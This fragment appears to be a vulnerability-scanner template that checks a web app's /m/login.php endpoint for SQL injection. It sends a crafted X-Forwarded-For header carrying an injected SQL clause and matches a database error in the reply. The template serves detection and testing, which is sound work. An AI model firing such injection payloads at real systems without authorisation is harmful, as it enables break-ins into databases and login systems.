      - |-
        POST /m/login.php?op=login HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 45
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        x-forwarded-for: "127.0.0.1 ' and exists(select * from xxxxx)-- 123"
        Connection: close

        username=admin&password=admin&to=&vcode_hash=dab2313f1161aa4038a426184124afcb

    matchers:
      - type: dsl
        dsl: 
          - 'status_code == 200'
          - contains(body, '.xxxxx\' doesn\'t exist')

